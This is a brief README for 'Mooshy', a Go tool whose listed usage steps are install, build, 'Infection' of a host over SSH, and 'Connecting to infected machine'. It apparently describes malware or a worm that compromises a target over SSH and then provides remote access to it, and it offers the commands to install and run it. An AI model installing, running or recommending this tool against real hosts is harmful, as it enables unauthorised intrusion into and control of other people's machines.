# Mooshy

Installation:
```sh
    go get -u -v github.com/rvolosatovs/mooshy/cmd/mooshy
```

Development:
```sh
    make deps # only first time
    make
```

Infection:
```sh
    mooshy -ssh -addr <host>
```

Connecting to infected machine:
```sh
    mooshy -addr <host>
```
